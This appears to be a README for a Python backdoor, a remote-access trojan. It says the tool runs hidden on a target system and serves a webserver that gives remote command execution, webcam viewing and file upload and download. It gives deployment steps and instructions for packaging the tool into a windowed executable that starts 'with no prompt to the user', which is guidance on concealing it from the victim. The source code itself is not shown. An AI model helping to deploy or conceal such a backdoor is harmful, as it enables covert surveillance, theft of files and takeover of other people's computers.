
# Post deployment backdoor 

This is a backdoor created mainly with Python. It runs in the background of the target system while also hosting a webserver that you can connect to. You can edit the port that the webserver is running on in the `client.py` file.

On the webserver you have access to multiple different tools. Here are some of them.
* Command execution
* Webcam viewer
* Image viewer
* Upload files to the target system
* Download files from the target system


## Deployment

Steps to deploy the project:

1. Install **all** files
2. Make sure all files are in the same directory/folder
3. Place the ***index.html*** file in a new folder called ***templates***
4. Place the ***styles.css*** file in a new folder called ***static***
5. Run the ***client.py*** file

##

In the `source` folder there are folders labeled: `flask`, `flask_cors`, `itsdangerous`, and `werkzeug`.

These folders are here for if you choose to manually compile the code into an executable. These modules aren't seen by pyinstaller for whatever reason when they were in the virtual environment folder. The steps to compile manually are below this.

1. Create a folder
2. Place all the files/folders in the previously created folder
3. Make sure the html files are in the templates folder
4. Make sure the css file is in the static folder
5. Make sure the module folders are in the first created folder
6. Install auto-py-to-exe
7. Set `Script Location` to `client.py`
8. Select `One File` and `Window Based` (Choose window based if you want to hide the console, otherwise choose console based)
9. Choose an .ico file if you want
10. Open the `Additional Files` tab
11. Add two folders. The `templates`, and `static` folder
12. Open the `Advanced` tab
13. Click `--hidden-import` four times.
14. In the four boxes enter the following: `flask`, `flask_cors`, `itsdangerous`, `werkzeug`.
15. Click `convert`
16. Now you have a working exe file. Once it's clicked it will start running with no prompt to the user.


## Dependencies

Python 3 or higher

`pip install Flask`
`pip install Flask-Cors`

`pip install opencv-python`


